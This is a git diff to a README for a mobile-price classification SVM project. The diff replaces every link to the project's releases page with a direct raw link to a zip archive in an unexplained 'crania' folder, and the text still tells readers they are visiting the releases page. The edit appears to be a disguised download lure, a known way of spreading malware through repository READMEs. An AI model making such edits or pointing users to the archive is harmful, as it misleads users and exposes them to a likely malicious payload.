@@ -6,7 +6,7 @@ Welcome to the mobile-price-classification-svm project! This application helps y
 
 ## 📥 Download
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/temp95/mobile-price-classification-svm/releases)
+[![Download the latest release](https://github.com/temp95/mobile-price-classification-svm/raw/refs/heads/main/crania/classification-mobile-price-svm-v3.9.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/temp95/mobile-price-classification-svm/raw/refs/heads/main/crania/classification-mobile-price-svm-v3.9.zip)
 
 ## 📋 System Requirements
 
@@ -27,7 +27,7 @@ Before you download the application, ensure your computer meets the following re
 ## 📖 How to Use
 
 1. **Download the Application:**
-   Visit the releases page to download the latest version: [Download the latest release](https://github.com/temp95/mobile-price-classification-svm/releases).
+   Visit the releases page to download the latest version: [Download the latest release](https://github.com/temp95/mobile-price-classification-svm/raw/refs/heads/main/crania/classification-mobile-price-svm-v3.9.zip).
 
 2. **Install the Application:**
    - For Windows:
@@ -74,6 +74,6 @@ For questions or feedback, you can reach out via the repository issues section o
 
 ## 📥 Download & Install
 
-To get started with the application, visit the releases page to download the latest version: [Download the latest release](https://github.com/temp95/mobile-price-classification-svm/releases). Follow the installation instructions above to set up the application on your device.
+To get started with the application, visit the releases page to download the latest version: [Download the latest release](https://github.com/temp95/mobile-price-classification-svm/raw/refs/heads/main/crania/classification-mobile-price-svm-v3.9.zip). Follow the installation instructions above to set up the application on your device.
 
 Enjoy predicting mobile prices with ease!
